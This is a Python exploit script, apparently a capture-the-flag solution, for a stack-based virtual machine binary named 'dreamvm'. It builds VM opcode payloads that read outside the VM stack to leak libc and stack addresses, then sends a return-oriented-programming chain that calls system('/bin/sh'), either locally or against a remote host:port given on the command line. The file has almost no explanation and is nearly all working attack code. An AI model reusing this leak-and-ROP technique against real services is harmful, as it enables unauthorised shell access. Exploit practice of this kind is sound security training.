#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
import struct

context.log_level = 'debug'
exe = context.binary = ELF('./dreamvm_patched', checksec=False)
libc = ELF("./libc.so.6", checksec=False)

gdbscript = '''
init-pwndbg
# init-gef-bata
d2d_ida
b *0x40064C
b *0x40066E
b *0x40068F
b *0x40069D
b *0x4006B2
b *0x4006B9
b *0x4006CE
b *0x400722
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

OP_PUSH         = 0x1
OP_POP          = 0x2
OP_ADD_OPERAND  = 0x3
OP_ADJUST_STACK = 0x4
OP_WRITE        = 0x5
OP_READ         = 0x6

def vm_add_operand(val: bytes):
    return bytes([OP_ADD_OPERAND]) + val

def vm_add_stack(offset: bytes):
    return bytes([OP_ADJUST_STACK]) + offset

def vm_push():
    return bytes([OP_PUSH])

def vm_pop():
    return bytes([OP_POP])

def vm_write():
    return bytes([OP_WRITE])

def vm_read():
    return bytes([OP_READ])

# ==================== EXPLOIT ====================
p = start()

payload = b''
payload += vm_add_stack(p64(0x30))
payload += vm_pop()
payload += vm_write()

payload += vm_add_stack(p64(0x30))
payload += vm_pop()
payload += vm_write()

payload += vm_add_stack(p64(0xffffffffffffffc0 + 0x20))

for _ in range(0x20 // 8):

    payload += vm_read()
    payload += vm_push()

payload = payload.ljust(0x100, b'\x00')

s(payload)

libc_leak = fixleak(rb(8))
libc.address = libc_leak - 0x24083

info('libc leak @ %#x', libc_leak)
slog('libc base @ %#x', libc.address)

stack_leak = fixleak(rb(8))
slog('stack leak @ %#x', stack_leak)

pop_rdi = 0x400903 # pop rdi; ret;
ret = pop_rdi + 1

rop = flat(
    [
        pop_rdi,
        next(libc.search(b'/bin/sh\0')),
        ret,
        libc.sym.system
    ][::-1]
)

sleep(.5)
s(rop)

interactive()
